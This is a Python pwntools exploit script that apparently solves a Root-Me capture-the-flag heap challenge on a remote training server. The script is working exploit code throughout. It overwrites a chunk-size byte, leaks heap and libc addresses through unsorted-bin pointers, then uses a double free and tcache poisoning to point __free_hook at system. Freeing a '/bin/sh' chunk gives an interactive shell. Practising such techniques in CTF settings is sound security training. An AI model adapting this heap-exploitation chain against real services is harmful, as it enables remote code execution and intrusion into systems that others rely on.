from pwn import *

context.arch = "x86_64"

global p, libc

p = remote("challenge03.root-me.org", 56544)
libc = ELF("./libc6_2.27-3ubuntu1.2_amd64.so")


def new_entry(name, age):

    p.recvuntil("> ")
    p.sendline("1")

    p.recvuntil("Name: ")
    p.sendline(name)

    p.recvuntil("Age: ")
    p.sendline(str(age))


def delete_entry(index):

    p.recvuntil("> ")
    p.sendline("2")

    p.recvuntil("delete: ")
    p.sendline(str(index))


def change_entry(index, name, age):

    p.recvuntil("> ")
    p.sendline("3")

    p.recvuntil("change: ")
    p.sendline(str(index))

    p.recvuntil("name: ")
    p.sendline(name)

    p.recvuntil("age: ")
    p.sendline(str(age))


def view_all():

    p.recvuntil("> ")
    p.sendline("4")

def main():

    changed = []
    for i in range(9):

        new_entry(b'A' * 24, 15)
        new_entry(b'B' * 24, 15)
        new_entry(b'C' * 32, 15)
        change_entry(3 * i, b'D' * 24 + b'\x91', 15)
        changed.append(3 * i)

    for i in range(7):

        delete_entry(changed[i] + 1)

    #this chunk is freed into unsorted bin
   

    #=============leaking heap ================

    #cleaning tcache bins of size 0x20
    new_entry(b'C' *10, 15)
    new_entry(b'C' *10, 15)
    new_entry(b'C' *10, 15)
    
    new_entry(b'H' * 56, 10)
    new_entry(b'I' * 56, 10)
    new_entry(b'G' * 56, 10)

    delete_entry(16)
    delete_entry(13)
    delete_entry(16)

    new_entry(b'D' * 56, 10)
    delete_entry(16)

    view_all()
    p.recvuntil("[13] ")
    heap_leak = p.recvuntil(",", drop=True).rstrip().ljust(8, b"\x00")
    heap_leak = u64(heap_leak)
    log.info(f"Heap leak: {hex(heap_leak)}")

    #======= libc leak ===================
    offset_to_unsorted_bin = 0x1c0
    unsorted_bin_addr = heap_leak - offset_to_unsorted_bin
    log.info(f"Unsorted bin at : {hex(unsorted_bin_addr)}")

    delete_entry(10)

    new_entry(b'Z' * 8, 10)
    new_entry(b'F' * 8 + p64(unsorted_bin_addr).replace(b'\x00', b'\x0a'), 10)
    
    delete_entry(22)
    change_entry(21, b'D' * 24 + b'\x21', 10)
    view_all()
    
    p.recvuntil("[13] ")
    libc_leak = p.recvuntil(",", drop=True).rstrip().ljust(8, b'\x00')
    libc_leak = u64(libc_leak)

    log.info(f"Libc leak: {hex(libc_leak)}")
    libc_base = libc_leak - 0xca0
    log.info(f"Libc base: {hex(libc_base)}")
    libc.address = libc_base
    free_hook = libc_base + 0x28e8
    system = libc_base - 0x39bb20

    log.info(f"free hook: {hex(free_hook)}")
    log.info(f"system : {hex(system)}")

    #dummy
    change_entry(1, b'/bin/sh\x00', 10)
    delete_entry(0)
    new_entry(b'X' * 40, 10)
    new_entry(b'Y' * 40, 10)
    
    #double free and tcache poisonning
    delete_entry(19)
    change_entry(0, b'X' * 40 + b'\x31', 10)
    
    delete_entry(19)
    new_entry(b'Y' *40, 10)
    delete_entry(19)
    
    delete_entry(20)
    new_entry(p64(free_hook).replace(b'\x00', b'\x0a', 1), 10)
    new_entry(p64(system).replace(b'\x00', b'\x0a', 1), 10)

    delete_entry(1)
    p.interactive()

if __name__ == "__main__":

    main()




    

